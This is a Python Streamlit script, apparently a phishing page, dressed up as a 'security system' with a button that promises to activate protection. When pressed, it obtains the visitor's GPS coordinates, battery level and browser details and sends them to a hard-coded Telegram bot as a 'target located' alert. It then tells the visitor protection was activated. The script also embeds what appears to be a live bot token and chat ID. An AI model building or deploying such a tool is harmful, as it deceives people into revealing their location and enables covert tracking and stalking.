import streamlit as st
import time
import requests
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. Configurações de Conexão
TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
SEU_ID = "8210828398"

def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
    payload = {"chat_id": SEU_ID, "text": mensagem, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload)
    except:
        pass

# 2. Configuração da Página
st.set_page_config(page_title="SISTEMA DE SEGURANÇA", page_icon="🔐", layout="centered")

# 3. Visual do Site (CSS)
st.markdown("""
    <style>
    .main { background-color: #000000; color: #ffffff; }
    .stButton>button {
        width: 100%; border-radius: 10px; height: 3em;
        background-color: #ffc107; color: black; font-weight: bold;
    }
    .radar {
        width: 150px; height: 150px; border: 4px solid #ffc107;
        border-radius: 50%; margin: 20px auto; position: relative;
        animation: pulse 2s infinite;
    }
    @keyframes pulse {
        0% { transform: scale(0.9); opacity: 0.7; }
        50% { transform: scale(1); opacity: 1; }
        100% { transform: scale(0.9); opacity: 0.7; }
    }
    .footer { text-align: center; color: #666; font-size: 12px; margin-top: 50px; }
    </style>
    <div style="text-align: center;">
        <h1 style='color: #ffc107;'>🛡️ SISTEMA DE SEGURANÇA</h1>
        <div class="radar"></div>
    </div>
    """, unsafe_allow_html=True)

# 4. Coleta de Informações
user_agent = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')

# 5. Botão e Lógica de Envio
if st.button("🔴 ATIVAR PROTEÇÃO"):
    with st.status("Localizando dispositivo...", expanded=True) as status:
        loc = get_geolocation()
        if loc:
            lat = loc['coords']['latitude']
            lon = loc['coords']['longitude']
            mapa = f"https://www.google.com/maps?q={lat},{lon}"
            
            msg = f"🚨 ALVO LOCALIZADO!\n\n📍 Link Google Maps: {mapa}\n🔋 Bateria: {bateria}%\n📱 Dispositivo: {user_agent}"
            
            enviar_telegram(msg)
            status.update(label="Localização Enviada!", state="complete", expanded=False)
            st.success("Proteção Ativada com Sucesso!")
        else:
            st.error("Erro: Por favor, autorize o GPS no seu navegador.")

st.markdown('<div class="footer">Sistema De Segurança Integrado Desenvolvido Por Miamy ©2026</div>', unsafe_allow_html=True)
